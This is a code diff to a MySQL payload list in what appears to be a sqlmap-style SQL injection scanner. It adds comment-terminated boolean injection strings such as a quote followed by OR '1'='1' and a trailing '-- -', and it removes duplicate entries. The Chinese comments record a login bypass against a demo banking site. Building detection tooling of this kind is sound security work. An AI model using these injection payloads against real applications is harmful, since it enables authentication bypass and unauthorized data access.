@@ -126,8 +126,15 @@ export const mysqlPayloads = {
     "{ORIG} AND 1=1",
     "{ORIG} AND 1=2",
     // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
-    "{ORIG}' OR '1'='1",
-    "{ORIG}' OR '1'='2",
+    // [D209] 补注释后缀。SQL 里 AND 优先于 OR ⇒ 目标若写成 `WHERE uid='…' AND passw='…'`，
+    // 裸 `… OR '1'='1'` 被 `AND passw=…` 续接后恒假 ⇒ 真/假两组都落空 ⇒ 空基线兜底对
+    // （ti:7/fi:6）静默失效。实测 demo.testfire.net（POST /doLogin，testuser 不是有效用户）：
+    //   `testuser' OR '1'='1`       → login.jsp（失败）
+    //   `testuser' OR '1'='1'-- -`  → bank/main.jsp（成功）
+    // 这份是 **dbms 指纹未识别时的回退模板集**（见 BooleanBlindDetector.detect 的 `|| PAYLOADS.MySQL.boolean`），
+    // 所以它比单个库的模板更关键。
+    "{ORIG}' OR '1'='1'-- -",
+    "{ORIG}' OR '1'='2'-- -",
     // —— 深度扩容：注释符变体（# / /**/）—— 对标 sqlmap boundary 注释体系 ——
     "{ORIG}' AND 1=1#",
     "{ORIG}' AND 1=2#",
@@ -203,9 +210,10 @@ export const mysqlPayloads = {
     "{ORIG} AND (SELECT 1 FROM DUAL WHERE 1=2)-- -",
     // —— INSERT VALUES 除零差异变体（真模板已存在，补假=除零；对标 sqlmap INSERT VALUES）——
     "{ORIG}),(1,(SELECT 1/0))-- -",
-    // —— OR 字符串变体（risk>=2 补充；带注释结尾）——
-    "{ORIG}' OR '1'='1'-- -",
-    "{ORIG}' OR '1'='2'-- -",
+    // [D209] 此处原有两条 `{ORIG}' OR '1'='1'-- -` / `…'1'='2'-- -` 的副本（"OR 字符串变体"），
+    // 与 boolean[6]/[7] 逐字重复 —— 而 legacy 路径只引用固定索引 [0,2]/[1,3]/[4,5]/[6,7]，
+    // 数组末尾这两条**从未被投放**。已删除副本、把注释后缀直接补在 [6]/[7] 上（见本条数组上部），
+    // 语义不变、条数 -2、消除重复。
     "{ORIG} OR '1'='1'-- -",
     "{ORIG} OR '1'='2'-- -",
     // [SQLMAP-PARITY] RLIKE regex boolean（纯布尔语义，无延时副作用）
